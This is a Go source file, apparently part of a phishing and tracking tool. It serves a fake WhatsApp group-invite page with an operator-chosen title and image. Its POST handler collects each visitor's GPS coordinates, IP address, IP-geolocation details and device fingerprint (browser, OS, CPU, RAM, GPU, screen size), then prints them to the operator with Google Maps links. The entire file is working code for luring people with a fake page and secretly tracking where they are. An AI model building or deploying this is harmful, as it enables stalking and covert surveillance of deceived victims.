package handler

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	c "github.com/cipheras/gohelper"
)

// Hndl ...
// type Hndl int

// Whatsapp ...
func (h Hndl) Whatsapp() {
	var title, img string
	c.Cprint(c.S, "Enter group title: ")
	fmt.Scanln(&title)
	c.Cprint(c.S, "Enter group image path (e.g. /home/$USER/...): ")
	fmt.Scanln(&img)
	iname := strings.Split(img, "/") //image name from path
	iloc, err := os.Open(img)        //open original img
	c.Try("", err, false)
	ilocNew, err := os.Create("template/whatsapp/static/images/" + iname[len(iname)-1]) //open copy img
	c.Try("", err, false)
	io.Copy(ilocNew, iloc) //copy img data
	iloc.Close()
	ilocNew.Close()
	newImgPath := "static/images/" + iname[len(iname)-1] //new copied img path
	defer os.Remove(newImgPath)

	fs := http.FileServer(http.Dir("template/whatsapp"))
	http.Handle("/static/", fs)
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {

		case "GET": //GET request handler
			type Data struct {
				Title string
				Img   string
			}
			data := Data{
				Title: title,
				Img:   newImgPath,
			}
			tpl, err := template.ParseFiles("template/whatsapp/index.html")
			c.Try("", err, false)
			err = tpl.Execute(w, data)
			c.Try("", err, false)

		//Don't change this code
		case "POST": //POST request handler
			err := r.ParseForm()
			c.Try("", err, false)
			if r.FormValue("Flag") == "1" { //Access granted
				li := "\t Latitude        :    " + r.FormValue("Lat") +
					"\n\t Longitude       :    " + r.FormValue("Lon") +
					"\n\t Accuracy        :    " + r.FormValue("Acc") +
					"\n\t Altitude        :    " + r.FormValue("Alt") +
					"\n\t Direction       :    " + r.FormValue("Dir") +
					"\n\t Speed           :    " + r.FormValue("Spd")
				c.Cprint(c.N, "GPS Location Information:") //Location Information
				fmt.Println(li)
				fmt.Printf("\n"+c.CYAN+"["+c.GREEN+"+"+c.CYAN+"] %vGoogle Maps: %vhttps://www.google.com/maps/place/%v+%v%v", c.PURPLE, c.GREEN, r.FormValue("Lat"), r.FormValue("Lon"), c.RESET+"\n")
				// fmt.Printf("\n %vGoogle Maps : %vhttps://www.google.com/maps/place/%v+%v%v", c.PURPLE, c.GREEN, r.FormValue("Lat"), r.FormValue("Lon"), c.RESET)
			} else if r.FormValue("Flag") == "0" { //Access denied
				c.Cprint(c.N, "GPS Location Information:")
				switch {
				case r.FormValue("Denied") != "":
					fmt.Println("\t Denied      :\t" + r.FormValue("Denied"))
				case r.FormValue("Una") != "":
					fmt.Println("\t Unavailable      :\t" + r.FormValue("Una"))
				case r.FormValue("Time") != "":
					fmt.Println("\t Timeout      :\t" + r.FormValue("Time"))
				case r.FormValue("Unk") != "":
					fmt.Println("\t Unknown      :\t" + r.FormValue("Unk"))
				}
			} else {
				// get IP details if IP available by request headers
				IPAddress := r.Header.Get("X-Real-Ip")
				if IPAddress == "" {
					IPAddress = r.Header.Get("X-Forwarded-For")
				}
				if IPAddress == "" {
					IPAddress = r.RemoteAddr
				}
				/*
					res1, err := http.Get("https://json.geoiplookup.io/" + string(IPAddress))
					c.Try("", err, false)
					if res1.StatusCode == 200 {
						r1, _ := ioutil.ReadAll(res1.Body)
						fmt.Println(string(r1))
					}

					res2, err := http.Get("http://free.ipwhois.io/json/" + string(IPAddress))
					c.Try("", err, false)
					if res2.StatusCode == 200 {
						r2, _ := ioutil.ReadAll(res1.Body)
						fmt.Println(string(r2))
					}
				*/

				// di := "\t External IP     :    " + string() +
				di := "\t IP               :\t" + IPAddress +
					"\n\t Referer          :\t" + r.Referer() +
					"\n\t Platform         :\t" + r.FormValue("Ptf") +
					"\n\t Browser          :\t" + r.FormValue("Brw") +
					"\n\t CPU Cores        :\t" + r.FormValue("Cc") +
					"\n\t RAM              :\t" + r.FormValue("Ram") +
					"\n\t GPU Vendor       :\t" + r.FormValue("Ven") +
					"\n\t GPU              :\t" + r.FormValue("Ren") +
					"\n\t Resolution       :\t" + r.FormValue("Wd") + " X " + r.FormValue("Ht") +
					"\n\t OS               :\t" + r.FormValue("Os") +
					"\n\t Java Enabled     :\t" + r.FormValue("Java")
				fmt.Println("\n" + c.RED + "####################################################################" + c.RESET)
				c.Cprint(c.N, "Device Information:") //Device Information
				fmt.Println(di)

				// getting IP details from JS
				time.Sleep(1 * time.Second)
				c.Cprint(c.N, "IP Information:") //IP Information
				ipResult := make(map[string]interface{})
				err := json.Unmarshal([]byte(r.FormValue("Ipp")), &ipResult)
				c.Try("", err, false)

				fmt.Println("\t External IP      :\t", ipResult["ip"])
				fmt.Println("\t ISP              :\t", ipResult["isp"])
				fmt.Println("\t Organisation     :\t", ipResult["org"])
				fmt.Println("\t Latitude         :\t", ipResult["latitude"])
				fmt.Println("\t Longitude        :\t", ipResult["longitude"])
				fmt.Println("\t Postal Code      :\t", ipResult["postal_code"])
				fmt.Println("\t City             :\t", ipResult["city"])
				fmt.Println("\t Region           :\t", ipResult["region"])
				fmt.Println("\t District         :\t", ipResult["district"])
				fmt.Println("\t Country          :\t", ipResult["country_name"])
				fmt.Println("\t Continent        :\t", ipResult["continent_name"])
				fmt.Println("\t Timezone         :\t", ipResult["timezone_name"])
				fmt.Println("\t Connection Type  :\t", ipResult["connection_type"])
				fmt.Println("\t ASN Number       :\t", ipResult["asn_number"])
				fmt.Println("\t ASN Organisation :\t", ipResult["asn_org"])
				fmt.Println("\t ASN              :\t", ipResult["asn"])

				// for k, v := range ipResult {
				// 	fmt.Println("\t "+k+"      :\t", v)
				// }
				fmt.Printf("\n"+c.CYAN+"["+c.GREEN+"+"+c.CYAN+"] %vGoogle Maps: %vhttps://www.google.com/maps/place/%v+%v%v", c.PURPLE, c.GREEN, ipResult["latitude"], ipResult["longitude"], c.RESET+"\n")
			}

		default:
			fmt.Fprintln(w, "Request not supported")
			fmt.Println("# Unsupported request")
			return
		}
	})
}
